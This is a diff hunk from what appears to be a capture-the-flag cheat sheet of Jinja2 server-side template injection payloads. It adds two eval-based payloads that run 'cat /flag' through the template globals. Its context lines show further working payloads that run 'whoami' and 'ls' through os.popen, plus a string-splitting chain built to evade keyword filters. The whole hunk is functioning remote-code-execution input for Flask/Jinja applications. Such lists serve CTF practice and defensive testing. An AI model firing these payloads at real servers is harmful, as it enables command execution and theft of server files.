@@ -119,6 +119,8 @@ your input object基类的子类
 {{lipsum.__globals__.os.popen('whoami').read()}}
 {{cycler.__init__.__globals__.os.popen('ls').read()}}
 
+{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
+{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
 
 {{ }}
 config|attr('__in''it__')|attr('__glo''bals__')|attr('__geti''tem__')('os')|attr('popen')('ca''t /f''lag')|attr('re''ad')()
